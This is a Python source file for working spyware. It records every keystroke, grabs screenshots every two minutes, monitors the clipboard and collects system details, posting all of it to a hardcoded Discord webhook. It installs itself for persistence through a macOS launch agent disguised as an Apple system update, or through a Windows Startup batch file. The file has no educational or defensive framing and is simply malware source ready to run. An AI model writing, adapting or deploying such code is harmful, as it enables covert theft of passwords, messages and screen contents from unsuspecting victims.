import logging
from pynput import keyboard
import requests
import os
import platform
import socket
import threading
import time
from PIL import ImageGrab
import clipboard

# Your actual Discord Webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1275636071421448254/yfVS5vYWNKMHnPvEKgRnB95EZ84MXzfoVxoY5ytgNLW6k_DKx3tCmP6nMvR22G-p6uZW'

# Automatically determine the log directory based on the platform
if platform.system() == "Darwin":  # macOS
    log_dir = os.path.expanduser("~/Library/Logs/")
elif platform.system() == "Windows":
    log_dir = os.path.expanduser("~/AppData/Local/Logs/")
else:
    log_dir = "/var/log/"

# Set log file path
log_file = os.path.join(log_dir, "keylog.txt")

# Configure logging to save keystrokes locally
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# Function to send data to Discord via webhook
def send_to_discord(message, file_path=None):
    data = {
        "content": message
    }
    files = {}
    if file_path:
        files = {'file': open(file_path, 'rb')}
    try:
        response = requests.post(WEBHOOK_URL, json=data, files=files)
        if response.status_code == 204:
            print("Data sent successfully.")
        else:
            print("Failed to send data.")
    except Exception as e:
        print(f"An error occurred: {e}")


# Function to log keystrokes
def on_press(key):
    try:
        key_data = str(key).replace("'", "")
        if key_data == "Key.space":
            key_data = " "
        if key_data == "Key.enter":
            key_data = "\n"
        if key_data == "Key.backspace":
            key_data = "[BACKSPACE]"
        if key_data == "Key.tab":
            key_data = "[TAB]"
        if key_data == "Key.esc":
            key_data = "[ESC]"
        logging.info(key_data)
        send_to_discord(key_data)
    except Exception as e:
        print(f"An error occurred: {e}")


# Function to capture screenshots
def capture_screenshot():
    while True:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(log_dir, "screenshot.png")
        screenshot.save(screenshot_path)
        send_to_discord("Screenshot captured", screenshot_path)
        time.sleep(120)  # Capture every 2 minutes


# Function to log clipboard data
def log_clipboard():
    recent_data = ""
    while True:
        temp_data = clipboard.paste()
        if temp_data != recent_data:
            recent_data = temp_data
            logging.info(f"Clipboard: {recent_data}")
            send_to_discord(f"Clipboard: {recent_data}")
        time.sleep(10)  # Check clipboard every 10 seconds


# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# Function to get basic system information
def get_system_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    user = os.getlogin()
    system_info = f"Hostname: {hostname}\nIP Address: {ip_address}\nUser: {user}\nPlatform: {platform.system()}\nPlatform-Release: {platform.release()}\n"
    send_to_discord(f"**System Information:**\n{system_info}")


# Function to make the script persistent
def make_persistent():
    if platform.system() == "Darwin":  # macOS
        startup_dir = os.path.expanduser("~/Library/LaunchAgents/")
    elif platform.system() == "Windows":
        startup_dir = os.path.expanduser("~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
    else:
        startup_dir = "/etc/init.d/"

    if not os.path.exists(startup_dir):
        os.makedirs(startup_dir)

    if platform.system() == "Darwin":
        plist_content = f'''
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.apple.systemupdate</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/usr/bin/python3</string>
                    <string>{os.path.realpath(__file__)}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
        </plist>
        '''
        plist_path = os.path.join(startup_dir, "com.apple.systemupdate.plist")
        with open(plist_path, "w") as plist_file:
            plist_file.write(plist_content)
    elif platform.system() == "Windows":
        bat_content = f'''
        @echo off
        python {os.path.realpath(__file__)}
        '''
        bat_path = os.path.join(startup_dir, "keylogger.bat")
        with open(bat_path, "w") as bat_file:
            bat_file.write(bat_content)


if __name__ == "__main__":
    get_system_info()  # Send system info to Discord
    make_persistent()  # Make the script persistent

    # Start threads for different functionalities
    threading.Thread(target=start_keylogger).start()
    threading.Thread(target=capture_screenshot).start()
    threading.Thread(target=log_clipboard).start()
